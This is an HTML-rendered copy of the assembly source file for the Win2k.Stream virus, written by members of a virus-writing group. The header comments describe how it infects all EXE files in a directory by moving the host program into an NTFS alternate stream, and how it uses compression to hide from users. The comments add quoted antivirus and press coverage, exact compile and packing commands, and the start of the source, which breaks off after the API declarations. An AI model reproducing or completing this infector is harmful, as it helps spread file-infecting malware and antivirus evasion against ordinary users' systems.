<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>stream.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; COMMENT#</span><span class="sc0">
</span><span class="sc1">;                           ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                           ³    Win2k.Stream    ³</span><span class="sc0">
</span><span class="sc1">;                           ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;                       ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                       ³ by Benny/29A and Ratter ³</span><span class="sc0">
</span><span class="sc1">;                       ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Let us introduce very small and simple infector presenting how to use features</span><span class="sc0">
</span><span class="sc1">; of NTFS in viruses. This virus loox like standard Petite-compressed PE file.</span><span class="sc0">
</span><span class="sc1">; However, it presents the newest way of PE file infecting method.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; How the virus worx? It uses streamz, the newest feature of NTFS filesystem</span><span class="sc0">
</span><span class="sc1">; and file compression, already implemented in old NTFS fs.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;  ³ Basic principles of NTFS streamz ³</span><span class="sc0">
</span><span class="sc1">;  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; How the file loox? Ya know that the file contains exactly the same what you can</span><span class="sc0">
</span><span class="sc1">; see when you will open it (e.g. in WinCommander). NTFS, implemented by</span><span class="sc0">
</span><span class="sc1">; Windows 2000, has new feature - the file can be divided to streamz. The content</span><span class="sc0">
</span><span class="sc1">; what you can see when you will open the file is called Primary stream - usually</span><span class="sc0">
</span><span class="sc1">; files haven't more than one stream. However, you can create NEW stream ( = new</span><span class="sc0">
</span><span class="sc1">; content) in already existing file without overwritting the content.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Example:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; addressing of primary stream -&gt;   &lt;filename&gt; e.g. "calc.exe"</span><span class="sc0">
</span><span class="sc1">; addressing of other streamz -&gt;    &lt;filename&gt;:&lt;stream name&gt; e.g. "calc.exe:stream"</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; If you have NTFS, you can test it. Copy to NTFS for instance "calc.exe", and</span><span class="sc0">
</span><span class="sc1">; then create new file "calc.exe:stream" and write there "blahblah". Open</span><span class="sc0">
</span><span class="sc1">; "calc.exe". Whats there? Calculator ofcoz. Now open "calc.exe:stream". Whats</span><span class="sc0">
</span><span class="sc1">; there? "blahblah", the new file in the old one :)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Can you imagine how useful r streamz for virus coding?</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The virus infects file by moving the old content to the new stream and replacing</span><span class="sc0">
</span><span class="sc1">; the primary stream with virus code.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; File (calc.exe) before infection:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   ÉÍCalc.exeÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»</span><span class="sc0">
</span><span class="sc1">;   ºÚÄPrimary stream (visible part)Ä¿º</span><span class="sc0">
</span><span class="sc1">;   º³         Calculator            ³º</span><span class="sc0">
</span><span class="sc1">;   ºÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙº</span><span class="sc0">
</span><span class="sc1">;   ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; File (calc.exe) after infection:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   ÉÍCalc.exeÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»</span><span class="sc0">
</span><span class="sc1">;   ºÚÄPrimary stream (calc.exe)Ä¿ÚÄNext stream (calc.exe:STR)Ä¿ º</span><span class="sc0">
</span><span class="sc1">;   º³         Virus             ³³         Calculator         ³ º</span><span class="sc0">
</span><span class="sc1">;   ºÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ º</span><span class="sc0">
</span><span class="sc1">;   ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Simple and efficent, ain't it?</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;  ³ Details of virus ³</span><span class="sc0">
</span><span class="sc1">;  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; * The virus infects all EXE files in actual directory.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; * The virus uses as already-infected mark file compression. All infected</span><span class="sc0">
</span><span class="sc1">;   files are compressed by NTFS and virus then does not infect already</span><span class="sc0">
</span><span class="sc1">;   compressed files. Well, almost all files after infection r smaller than</span><span class="sc0">
</span><span class="sc1">;   before, so user won't recognize virus by checking free disk space :)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; * If user will copy the infected file to non-NTFS partition (in this case</span><span class="sc0">
</span><span class="sc1">;   only primary stream is copied), the host program will be destroyed and</span><span class="sc0">
</span><span class="sc1">;   instead of running host program virus will show message box. That can</span><span class="sc0">
</span><span class="sc1">;   be also called as payload :P</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; * The virus is very small, exactly 3628 bytes, becoz it's compressed by</span><span class="sc0">
</span><span class="sc1">;   Petite 2.1 PE compression utility (http://www.icl.ndirect.co.uk/petite/).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; * The disinfection is very easy - just copy the content of &lt;file&gt;:STR to</span><span class="sc0">
</span><span class="sc1">;   &lt;file&gt; and delete &lt;file&gt;:STR. If you want to create sample of infected</span><span class="sc0">
</span><span class="sc1">;   file, then just copy the virus to some file and copy any program (host</span><span class="sc0">
</span><span class="sc1">;   program) to &lt;file&gt;:STR. Thats all! However, AVerz have to rebuild their</span><span class="sc0">
</span><span class="sc1">;   search engine to remove this virus, becoz until now, they had no fucking</span><span class="sc0">
</span><span class="sc1">;   idea what are streamz :)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; * This virus was coded in Czech Republic by Benny/29A and Ratter, on our</span><span class="sc0">
</span><span class="sc1">;   common VX meeting at Ratter's city... we just coded it to show that</span><span class="sc0">
</span><span class="sc1">;   Windows 2000 is just another OS designed for viruses... it really is :)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; * We would like to thank GriYo for pointing us to NTFS new features.</span><span class="sc0">
</span><span class="sc1">;   The fame is also yourz, friend!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;  ³ In the media ³</span><span class="sc0">
</span><span class="sc1">;  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  AVP's description:</span><span class="sc0">
</span><span class="sc1">;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; This is the first known Windows virus using the "stream companion" infection</span><span class="sc0">
</span><span class="sc1">; method. That method is based on an NTFS feature that allows to create multiple</span><span class="sc0">
</span><span class="sc1">; data streams associated with a file.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; *NTFS Streams*</span><span class="sc0">
</span><span class="sc1">; ---------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Each file contains at least one default data stream that is accessed just by</span><span class="sc0">
</span><span class="sc1">; the file name. Each file may also contain additional stream(s) that can be</span><span class="sc0">
</span><span class="sc1">; accessed by their personal names (filename:streamname).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The default file stream is the file body itself (in pre-NTFS terms). For</span><span class="sc0">
</span><span class="sc1">; instance, when an EXE file is executed the program is read from the default</span><span class="sc0">
</span><span class="sc1">; file stream; when a document is opened, its content is also read from the</span><span class="sc0">
</span><span class="sc1">; default stream.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Additional file streams may contain any data. The streams cannot be accessed or</span><span class="sc0">
</span><span class="sc1">; modified without reference to the file. When the file is deleted, its streams</span><span class="sc0">
</span><span class="sc1">; are deleted as well; if the file is renamed, the streams follow its new name.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; In the Windows package there is no standard tool to view/edit file streams. To</span><span class="sc0">
</span><span class="sc1">; "manually" view file streams you need to use special utilities, for instance</span><span class="sc0">
</span><span class="sc1">; the FAR utility with the file steams support plug-in (Ctrl-PgDn displays file</span><span class="sc0">
</span><span class="sc1">; streams for selected file).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; *Virus Details*</span><span class="sc0">
</span><span class="sc1">; ----------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The virus itself is a Windows application (PE EXE file) compressed using the</span><span class="sc0">
</span><span class="sc1">; Petite PE EXE file compressor and is about 4K in size. When run it infects all</span><span class="sc0">
</span><span class="sc1">; EXE files in the current directory and then returns control to the host file.</span><span class="sc0">
</span><span class="sc1">; If any error occurs, the virus displays the message:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Win2k.Stream by Benny/29A &amp; Ratter</span><span class="sc0">
</span><span class="sc1">;  This cell has been infected by [Win2k.Stream] virus!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; While infecting a file the virus creates a new stream associated with the victim</span><span class="sc0">
</span><span class="sc1">; file. That stream has the name "STR", i.e. the complete stream name is</span><span class="sc0">
</span><span class="sc1">; "FileName:STR". The virus then moves the victim file body to the STR stream</span><span class="sc0">
</span><span class="sc1">; (default stream, see above) and then overwrites the victim file body (default</span><span class="sc0">
</span><span class="sc1">; stream) with its (virus) code.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; As a result, when an infected file is executed Windows reads the default stream</span><span class="sc0">
</span><span class="sc1">; (which is overwritten by virus code) and executes it. Also, Windows reports the</span><span class="sc0">
</span><span class="sc1">; same file size for all infected files - that is the virus length.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; To release control to the host program the virus just creates a new process by</span><span class="sc0">
</span><span class="sc1">; accessing the original file program using the name "FileName:STR".</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; That infection method should work on any NTFS system, but the virus checks the</span><span class="sc0">
</span><span class="sc1">; system version and runs only under Win2000.</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  AVP's press release:</span><span class="sc0">
</span><span class="sc1">;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; *A New Generation of Windows 2000 Viruses is Streaming Towards PC Users*</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Moscow, Russia, September 4, 2000 – Kaspersky Lab announces the discovery of</span><span class="sc0">
</span><span class="sc1">; W2K.Stream virus, which represents a new generation of malicious programs for</span><span class="sc0">
</span><span class="sc1">; Windows 2000. This virus uses a new breakthrough technology based on the</span><span class="sc0">
</span><span class="sc1">; "Stream Companion" method for self-embedding into the NTFS file system.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The virus originates from the Czech Republic and was created at the end of</span><span class="sc0">
</span><span class="sc1">; August by the hackers going by the pseudonyms of Benny and Ratter. To date,</span><span class="sc0">
</span><span class="sc1">; Kaspersky Lab has not registered any infections resulting from this virus;</span><span class="sc0">
</span><span class="sc1">; however, its working capacity and ability for existence "in-the-wild" are</span><span class="sc0">
</span><span class="sc1">; unchallenged.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; "Certainly, this virus begins a new era in computer virus creation," said</span><span class="sc0">
</span><span class="sc1">; Eugene Kaspersky, Head of Anti-Virus Research at Kaspersky Lab. "The ’Stream</span><span class="sc0">
</span><span class="sc1">; Companion’ technology the virus uses to plant itself into files makes its</span><span class="sc0">
</span><span class="sc1">; detection and disinfection extremely difficult to complete.”</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Unlike previously known methods of file infection (adding the virus body at</span><span class="sc0">
</span><span class="sc1">; beginning, ending or any other part of a host file), the "Stream" virus</span><span class="sc0">
</span><span class="sc1">; exploits the NTFS file system (Windows NT/2000) feature, which allows multiple</span><span class="sc0">
</span><span class="sc1">; data streams. For instance, in Windows 95/98 (FAT) files, there is only one</span><span class="sc0">
</span><span class="sc1">; data stream – the program code itself. Windows NT/2000 (NTFS) enables users</span><span class="sc0">
</span><span class="sc1">; to create any number of data streams within the file: independent executable</span><span class="sc0">
</span><span class="sc1">; program modules, as well as various service streams (file access rights,</span><span class="sc0">
</span><span class="sc1">; encryption data, processing time etc.). This makes NTFS files very flexible,</span><span class="sc0">
</span><span class="sc1">; allowing for the creation of user-defined data streams aimed at completing</span><span class="sc0">
</span><span class="sc1">; specific tasks.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; "Stream" is the first known virus that uses the feature of creating multiple</span><span class="sc0">
</span><span class="sc1">; data streams for infecting files of the NTFS file system (see picture 1). To</span><span class="sc0">
</span><span class="sc1">; complete this, the virus creates an additional data stream named "STR" and</span><span class="sc0">
</span><span class="sc1">; moves the original content of the host program there. Then, it replaces the</span><span class="sc0">
</span><span class="sc1">; main data stream with the virus code. As a result, when the infected program</span><span class="sc0">
</span><span class="sc1">; is run, the virus takes control, completes the replicating procedure and then</span><span class="sc0">
</span><span class="sc1">; passes control to the host program.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; *"Stream" file infection procedure*</span><span class="sc0">
</span><span class="sc1">; ------------------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; File before infection              File after infection</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿              ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³°°°°°°°°°°°°°°°°°°°³              ³°°°°°°°°°°°°°°°°°°°³</span><span class="sc0">
</span><span class="sc1">; ³°°°°°°°°°°°°°°°°°°°³              ³°°° main stream°°°°³</span><span class="sc0">
</span><span class="sc1">; ³°°°°°°°°°°°°°°°°°°°³              ³°°° virus body°°°°°³</span><span class="sc0">
</span><span class="sc1">; ³°°°°main stream°°°°³              ³°°°°°°°°°°°°°°°°°°°³</span><span class="sc0">
</span><span class="sc1">; ³°°°°°°°°°°°°°°°°°°°³              ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">; ³°°°°program body°°°³              ³°°°°°°°°°°°°°°°°°°°³</span><span class="sc0">
</span><span class="sc1">; ³°°°°°°°°°°°°°°°°°°°³              ³°additional stream°³</span><span class="sc0">
</span><span class="sc1">; ³°°°°°°°°°°°°°°°°°°°³              ³°°°program body°°°°³</span><span class="sc0">
</span><span class="sc1">; ³°°°°°°°°°°°°°°°°°°°³              ³°°°°°°°°°°°°°°°°°°°³</span><span class="sc0">
</span><span class="sc1">; ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´              ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">; ³±±±±±±±±±±±±±±±±±±±³              ³±±±±±±±±±±±±±±±±±±±³</span><span class="sc0">
</span><span class="sc1">; ³±±service streams±±³              ³±±service streams±±³</span><span class="sc0">
</span><span class="sc1">; ³±±±±±±±±±±±±±±±±±±±³              ³±±±±±±±±±±±±±±±±±±±³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ              ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; "By default, anti-virus programs check only the main data stream. There will be</span><span class="sc0">
</span><span class="sc1">; no problems protecting users from this particular virus," Eugene Kaspersky</span><span class="sc0">
</span><span class="sc1">; continues. "However, the viruses can move to additional data streams. In this</span><span class="sc0">
</span><span class="sc1">; case, many anti-virus products will become obsolete, and their vendors will be</span><span class="sc0">
</span><span class="sc1">; forced to urgently redesign their anti-virus engines."</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  In MSNBC's news:</span><span class="sc0">
</span><span class="sc1">;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; *New trick can hide computer viruses*</span><span class="sc0">
</span><span class="sc1">; *But experts question danger posed by ‘Stream’ technology*</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Sept. 6 — A new kind of computer virus has been released, but security experts</span><span class="sc0">
</span><span class="sc1">; are in disagreement over just how menacing it is. The virus demonstrates a</span><span class="sc0">
</span><span class="sc1">; technique that future writers can use to hide their malicious software from</span><span class="sc0">
</span><span class="sc1">; most current antivirus scanners. But some antivirus companies are playing down</span><span class="sc0">
</span><span class="sc1">; the threat.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; THE VIRUS, CALLED W2K.STREAM, poses little threat — it was written as a</span><span class="sc0">
</span><span class="sc1">; relatively benign “proof of concept.” But, according to a source who requested</span><span class="sc0">
</span><span class="sc1">; anonymity, it was posted on several virus writer Web sites over Labor Day</span><span class="sc0">
</span><span class="sc1">; weekend — making copycats possible.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The virus takes advantage of a little-used feature included in Windows 2000 and</span><span class="sc0">
</span><span class="sc1">; older Windows NT systems that allows programs to be split into pieces called</span><span class="sc0">
</span><span class="sc1">; streams. Generally, the body of a program resides in the main stream. But other</span><span class="sc0">
</span><span class="sc1">; streams can be created to store information related to what’s in the main</span><span class="sc0">
</span><span class="sc1">; stream. Joel Scambray, author of “Hacking Exposed,” described these additional</span><span class="sc0">
</span><span class="sc1">; streams as “Post-it notes” attached to the main file.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The problem is that antivirus programs only examine the main stream. W2K.Stream</span><span class="sc0">
</span><span class="sc1">; demonstrates a programmer’s ability to create an additional stream and hide</span><span class="sc0">
</span><span class="sc1">; malicious code there.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; “Certainly, this virus begins a new era in computer virus creation,” said</span><span class="sc0">
</span><span class="sc1">; Eugene Kaspersky, Head of Anti-Virus Research at Kaspersky Lab, in a press</span><span class="sc0">
</span><span class="sc1">; release. “The ‘Stream Companion’ technology the virus uses to plant itself into</span><span class="sc0">
</span><span class="sc1">; files makes its detection and disinfection extremely difficult to complete.”</span><span class="sc0">
</span><span class="sc1">;        </span><span class="sc0">
</span><span class="sc1">; *THIS BUG ISN’T DANGEROUS*</span><span class="sc0">
</span><span class="sc1">; ---------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; No W2K.stream infections have been reported, and experts don’t believe the</span><span class="sc0">
</span><span class="sc1">; virus is “in the wild” — circulating on the Internet — yet. At any rate, this</span><span class="sc0">
</span><span class="sc1">; virus actually makes things easy for antivirus companies. If a user is</span><span class="sc0">
</span><span class="sc1">; infected, the program creates an alternate stream and places the legitimate</span><span class="sc0">
</span><span class="sc1">; file in this alternate location; the virus replaces it as the main stream. That</span><span class="sc0">
</span><span class="sc1">; makes detection by current antivirus products easy. But future viruses could</span><span class="sc0">
</span><span class="sc1">; do just the opposite, evading current antivirus products.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; One antivirus researcher who requested anonymity called release of the bug</span><span class="sc0">
</span><span class="sc1">; “somewhat akin to the first macro virus.” He added that reengineering antivirus</span><span class="sc0">
</span><span class="sc1">; software to scan for multiple streams would be a complicated effort.</span><span class="sc0">
</span><span class="sc1">; “In this case, many anti-virus products will become obsolete, and their vendors</span><span class="sc0">
</span><span class="sc1">; will be forced to urgently redesign their anti-virus engines,” Kaspersky said.</span><span class="sc0">
</span><span class="sc1">;        </span><span class="sc0">
</span><span class="sc1">; *AN OLD ISSUE*</span><span class="sc0">
</span><span class="sc1">; ---------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; There is nothing new about the potential of exploiting the multiple stream</span><span class="sc0">
</span><span class="sc1">; issue; Scambray hints at the problem in the book “Hacking Exposed,” and</span><span class="sc0">
</span><span class="sc1">; described it even more explicitly in a 1998 Infoworld.com article.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The SANS Institute, a group of security researchers, issued an “alert”</span><span class="sc0">
</span><span class="sc1">; criticizing antivirus companies for not updating their products to scan the</span><span class="sc0">
</span><span class="sc1">; contents of any file stream earlier.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; “We found that the scanners were incapable of identifying viruses stored within</span><span class="sc0">
</span><span class="sc1">; an alternate data stream,” the report said. “For example if you create the file</span><span class="sc0">
</span><span class="sc1">; MyResume.doc:ILOVEYOU.vbs and store the contents of the I Love You virus within</span><span class="sc0">
</span><span class="sc1">; the alternate data stream file, none of the tested virus scanners were capable</span><span class="sc0">
</span><span class="sc1">; of finding the virus during a complete disk scan.”</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; But some antivirus companies described the threat as minimal because the</span><span class="sc0">
</span><span class="sc1">; alternate stream trick only hides the bug while it’s stored on a victim’s</span><span class="sc0">
</span><span class="sc1">; computer. Pirkka Palomaki, Director of Product Marketing for F-Secure Corp.,</span><span class="sc0">
</span><span class="sc1">; said for the virus to actually run, it has to come out of hiding and load into</span><span class="sc0">
</span><span class="sc1">; main memory.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; “It would be detected as it tried to activate,” Palomaki said. “But this</span><span class="sc0">
</span><span class="sc1">; signifies importance of real-time protection.” He added the virus would still</span><span class="sc0">
</span><span class="sc1">; have to find its way onto a victim’s computer; and that victim would have to</span><span class="sc0">
</span><span class="sc1">; be tricked into installing the virus using one of the traditional methods,</span><span class="sc0">
</span><span class="sc1">; such as clicking on an infected e-mail attachment.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; “It could increase the ability to for scanners to miss something,” said Pat</span><span class="sc0">
</span><span class="sc1">; Nolan, virus researcher at McAfee Corp. “But we’re on top of it. If there is</span><span class="sc0">
</span><span class="sc1">; a vulnerability, it will be short-lived.”</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;  ³ How to compile it? ³</span><span class="sc0">
</span><span class="sc1">;  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Use Petite version 2.1 (http://www.icl.ndirect.co.uk/petite/).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; tasm32 /ml /m9 /q stream</span><span class="sc0">
</span><span class="sc1">; tlink32 -Tpe -c -x -aa stream,,,import32</span><span class="sc0">
</span><span class="sc1">; pewrsec stream.exe</span><span class="sc0">
</span><span class="sc1">; petite -9 -e2 -v1 -p1 -y -b0 -r* stream.exe</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; And here comes the virus source...</span><span class="sc0">
</span><span class="sc1">; #</span><span class="sc0">


</span><span class="sc2">.586p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">stdcall</span><span class="sc0">


</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win32api.inc</span><span class="sc0">                </span><span class="sc1">;include filez</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">useful.inc</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">            </span><span class="sc1">;used APIz</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">VirtualFree</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">FindFirstFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">FindNextFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">FindClose</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">WinExec</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">GetCommandLineA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">GetModuleFileNameA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">DeleteFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ReadFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
